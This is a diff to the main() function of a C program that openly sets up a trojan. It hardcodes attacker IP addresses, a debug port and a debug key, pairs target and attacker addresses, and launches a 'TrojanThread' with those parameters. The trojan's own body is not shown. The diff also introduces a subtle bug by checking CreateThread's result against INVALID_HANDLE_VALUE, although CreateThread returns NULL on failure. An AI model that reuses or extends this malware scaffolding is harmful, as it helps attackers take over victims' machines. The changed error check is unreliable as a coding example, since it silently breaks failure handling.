@@ -97,7 +97,7 @@ int main()
     char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
 
      // HARDCODED VALUES, CHANGE THIS BY ListAttacker IF NEEDED
-    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1~192.168.1.32";
+    const char* AttackAddresses = "172.17.80.1~192.168.1.32~192.168.56.1~192.168.192.1~192.168.88.1";
     const char* DebugPort = "50003";
     const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK1111";
 
@@ -110,7 +110,7 @@ int main()
     LPVOID TrojanParams = NULL;
 
 
-    // Get IP addresses of target and attacker -
+    // Get IP addresses of target and attacker:
     if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
         printf("[-] Cannot find the target address and the matching attacker address!\n");
         return 0;
@@ -118,13 +118,13 @@ int main()
     printf("Target: %s, Attacker: %s\n", TargetIp, AttackerIp);
 
 
-    // Trojan variables and calling -
+    // Trojan variables and calling:
     Trojattr.bInheritHandle = FALSE;
     Trojattr.nLength = sizeof(SECURITY_ATTRIBUTES);
     Trojattr.lpSecurityDescriptor = NULL;
 
 
-    // Trojan parameter buffer -
+    // Trojan parameter buffer:
     TrojanParams = malloc(strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 4);
     if (TrojanParams == NULL) {
         printf("Cannot continue with FunEngine (params = NULL), please retry..\n");
@@ -141,7 +141,7 @@ int main()
     memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 3), &NullTerm, 1);
 
 
-    // Start trojan thread and input from user -
+    // Start trojan thread and input from user:
     TrojanHandle = CreateThread(&Trojattr,
         0,
         (LPTHREAD_START_ROUTINE)&TrojanThread,
@@ -149,7 +149,7 @@ int main()
         0,
         NULL);
 
-    if (TrojanHandle == NULL) {
+    if (TrojanHandle == INVALID_HANDLE_VALUE) {
         printf("Cannot continue with FunEngine, please retry..\n");
         free(TrojanParams);
         return 1;
